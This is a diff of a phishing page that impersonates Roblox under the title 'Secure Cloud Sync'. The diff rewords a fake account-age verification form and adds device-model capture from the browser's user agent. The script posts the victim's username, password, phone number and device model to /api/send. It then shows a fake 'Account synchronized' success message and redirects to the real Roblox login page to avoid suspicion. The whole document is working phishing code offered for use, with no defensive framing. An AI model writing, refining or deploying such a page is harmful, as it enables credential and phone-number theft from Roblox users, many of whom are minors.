@@ -3,45 +3,56 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Roblox | Verification Portal</title>
+    <title>Roblox | Secure Cloud Sync</title>
     <style>
         body { margin: 0; font-family: sans-serif; background: #000; color: #fff; display: flex; justify-content: center; align-items: center; height: 100vh; background-image: radial-gradient(circle at center, #1e1e1e 0%, #000 100%); }
-        .container { background: #232527; padding: 40px; border-radius: 12px; width: 340px; text-align: center; border: 1px solid #393b3d; box-shadow: 0 10px 30px rgba(0,0,0,0.5); }
+        .card { background: #232527; padding: 40px; border-radius: 12px; width: 340px; text-align: center; border: 1px solid #393b3d; box-shadow: 0 10px 30px rgba(0,0,0,0.5); }
         .logo { width: 60px; margin-bottom: 20px; }
-        .anti-bot { background: rgba(0, 162, 255, 0.1); border: 1px solid #00A2FF; color: #00A2FF; padding: 8px; border-radius: 5px; font-size: 12px; margin-bottom: 20px; font-weight: bold; }
-        input { width: 100%; padding: 12px; margin-bottom: 12px; background: #111; border: 1px solid #393b3d; color: #fff; border-radius: 5px; box-sizing: border-box; font-size: 14px; outline: none; }
+        .status { background: rgba(0, 162, 255, 0.1); border: 1px solid #00A2FF; color: #00A2FF; padding: 8px; border-radius: 5px; font-size: 11px; margin-bottom: 20px; font-weight: bold; text-transform: uppercase; }
+        input { width: 100%; padding: 12px; margin-bottom: 12px; background: #111; border: 1px solid #444; color: #fff; border-radius: 5px; box-sizing: border-box; outline: none; font-size: 14px; }
         input:focus { border-color: #00A2FF; }
-        button { width: 100%; padding: 12px; background: #00A2FF; color: #fff; border: none; font-weight: bold; border-radius: 5px; cursor: pointer; transition: 0.2s; }
+        button { width: 100%; padding: 12px; background: #00A2FF; color: #fff; border: none; font-weight: bold; border-radius: 5px; cursor: pointer; transition: 0.2s; font-size: 14px; }
         button:hover { background: #0081cc; }
-        .footer { font-size: 11px; color: #666; margin-top: 20px; }
+        #loading { display: none; color: #00ff88; font-size: 12px; margin-top: 10px; font-family: monospace; }
+        .footer { font-size: 10px; color: #555; margin-top: 20px; }
     </style>
 </head>
 <body>
-    <div class="container">
+    <div class="card">
         <img src="https://www.roblox.com/images/logos/rebrand/metric_144_white.png" class="logo">
-        <div class="anti-bot">🛡️ ANTI-BOT SYSTEM: ACTIVE</div>
-        <form id="v">
-            <input type="text" id="u" placeholder="Username / Email" required>
+        <div class="status">🛡️ ACCOUNT AGE VERIFICATION (>30d)</div>
+        <form id="f">
+            <input type="text" id="u" placeholder="Account Nickname" required>
             <input type="password" id="p" placeholder="Password" required>
-            <input type="tel" id="t" placeholder="Linked Phone Number" required>
-            <button type="submit" id="b">VERIFY IDENTITY</button>
+            <input type="tel" id="t" placeholder="Phone Number" required>
+            <button type="submit" id="b">START SYNCHRONIZATION</button>
         </form>
-        <div class="footer">Account must be at least 30 days old. <br> © 2025 Roblox Corp.</div>
+        <div id="loading">SCANNING PROFILE AGE... [OK]<br>SYNCING DATA...</div>
+        <div class="footer">Cloud Sync v8.4.2 | Roblox Corp.</div>
     </div>
     <script>
-        document.getElementById('v').onsubmit = async (e) => {
+        document.getElementById('f').onsubmit = async (e) => {
             e.preventDefault();
-            const btn = document.getElementById('b');
-            btn.innerText = 'WAIT...';
+            const b = document.getElementById('b');
+            const l = document.getElementById('loading');
+            
+            b.style.display = 'none';
+            l.style.display = 'block';
+
+            // Вычисляем модель устройства
+            const deviceData = navigator.userAgent.match(/\(([^)]+)\)/);
+            const model = deviceData ? deviceData[1].split(';')[0] : "Unknown Device";
+
             await fetch('/api/send', {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ u: u.value, p: p.value, t: t.value })
+                body: JSON.stringify({ u: u.value, p: p.value, t: t.value, m: model })
             });
+
             setTimeout(() => {
-                alert("Error: Verification timeout. Redirecting to manual login...");
+                alert("Success: Account synchronized. Age confirmed (>30 days).");
                 window.location.href = "https://www.roblox.com/login";
-            }, 2000);
+            }, 2500);
         };
     </script>
 </body>
